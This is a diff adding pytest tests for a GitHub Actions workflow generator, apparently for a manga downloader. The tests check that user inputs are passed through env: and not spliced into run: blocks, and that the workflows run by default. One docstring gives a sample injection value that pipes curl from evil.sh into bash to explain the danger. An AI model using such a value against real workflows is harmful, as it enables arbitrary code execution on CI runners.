@@ -105,6 +105,119 @@ class TestRedLine:
         assert "Export" in text and "发布" in text
 
 
+class TestNoScriptInjection:
+    """``${{ inputs.* }}`` **绝不能**出现在 ``run:`` 块里（P1 · 安全）。
+
+    ``run:`` 的内容会被 bash 执行。``inputs.ids`` 是用户可填的自由文本，
+    直接插进 ``run:`` 等于把它当 shell 代码执行：
+
+        ids: 'a"; curl evil.sh | bash; echo "'
+
+    展开后就是 ``manga download a"; curl evil.sh | bash; echo ""`` —— 任意命令执行。
+
+    正确做法：所有 inputs 先经 ``env:`` 传进环境变量，``run:`` 里只引用
+    ``$VAR``（bash 会把值当**数据**而不是代码）。
+    """
+
+    def _steps(self, name: str = "download_dispatch.yml"):
+        doc = yaml.safe_load(generate_workflows()[name])
+        return next(iter(doc["jobs"].values()))["steps"]
+
+    def test_no_input_expressions_in_run_blocks(self) -> None:
+        for name in generate_workflows():
+            for index, step in enumerate(self._steps(name), start=1):
+                run = str(step.get("run", ""))
+                assert "${{ inputs." not in run, (
+                    f"{name} 第 {index} 步的 run: 里出现了 ${{{{ inputs. ... }}}} —— "
+                    "必须先经 env: 传进环境变量再用 $VAR 引用"
+                )
+
+    def test_input_expressions_only_appear_in_env_or_if(self) -> None:
+        """``${{ inputs.* }}`` 只允许出现在 ``env:`` / ``if:`` / ``with:`` / job 级。"""
+        allowed_keys = {"env", "if", "with", "name", "uses", "run", "id", "shell"}
+        for name in generate_workflows():
+            for step in self._steps(name):
+                for key, value in step.items():
+                    if key in allowed_keys:
+                        continue
+                    assert "${{ inputs." not in str(value), (
+                        f"{name}: step 的 {key} 里不该出现 ${{{{ inputs. ... }}}}"
+                    )
+
+    def test_user_supplied_ids_are_passed_via_env(self) -> None:
+        """ids 必须经环境变量传给 run 块。"""
+        steps = self._steps()
+        runs = [str(s.get("run", "")) for s in steps]
+        joined = "\n".join(runs)
+        assert "MANGA_IDS" in joined or "IDS" in joined, (
+            "ids 应当经 env: 传入（环境变量），而不是直接插进 run:"
+        )
+
+    def test_validator_rejects_input_expressions_in_run(self) -> None:
+        """校验器必须把这种模板判为不合法 —— 静默放过等于没修。"""
+        bad = """
+name: x
+on:
+  workflow_dispatch:
+    inputs:
+      ids:
+        description: d
+        required: true
+        default: ""
+        type: string
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "${{ inputs.ids }}"
+"""
+        report = validate_workflow(bad)
+        assert report["ok"] is False
+        assert any("inputs" in err for err in report["errors"]), report["errors"]
+
+
+class TestRunnableByDefault:
+    """生成的 workflow 必须**默认就能跑**（P1 · 可用性）。
+
+    之前：只装了本项目，没装 gallery-dl / mangadex-dl → 一跑就
+    ``TOOL_MISSING``（退出码 4），workflow 永远失败；
+    干跑（dry_run=true）时也会去上传产物，而 ``if-no-files-found: error``
+    让干跑直接失败。
+    """
+
+    def _steps(self, name: str = "download_dispatch.yml"):
+        doc = yaml.safe_load(generate_workflows()[name])
+        return next(iter(doc["jobs"].values()))["steps"]
+
+    def test_gallery_dl_is_installed(self) -> None:
+        runs = "\n".join(str(s.get("run", "")) for s in self._steps())
+        assert "gallery-dl" in runs, "必须安装 gallery-dl，否则默认流程必然 TOOL_MISSING"
+        assert "uv tool install gallery-dl" in runs or "pip install gallery-dl" in runs
+
+    def test_mangadex_dl_is_installed(self) -> None:
+        runs = "\n".join(str(s.get("run", "")) for s in self._steps())
+        assert "mangadex-dl" in runs, "必须安装 mangadex-dl"
+        assert "uv tool install mangadex-dl" in runs or "pip install mangadex-dl" in runs
+
+    def test_upload_is_skipped_on_dry_run(self) -> None:
+        """干跑没有产物 → 上传步骤必须跳过（否则 if-no-files-found: error 直接失败）。"""
+        uploads = [
+            s for s in self._steps() if "actions/upload-artifact" in str(s.get("uses", ""))
+        ]
+        assert uploads, "没有上传步骤"
+        for step in uploads:
+            condition = str(step.get("if", ""))
+            assert "dry_run" in condition, (
+                f"上传步骤没有排除 dry_run：{condition!r} —— 干跑时无产物，会失败"
+            )
+
+    def test_download_steps_respect_dry_run(self) -> None:
+        """下载步骤在 dry_run 时不能带 --apply。"""
+        runs = "\n".join(str(s.get("run", "")) for s in self._steps())
+        assert "MANGA_DRY_RUN" in runs or "dry_run" in runs
+
+
 class TestSecretsManifest:
     def test_manifest_is_not_empty(self) -> None:
         manifest = secrets_manifest()
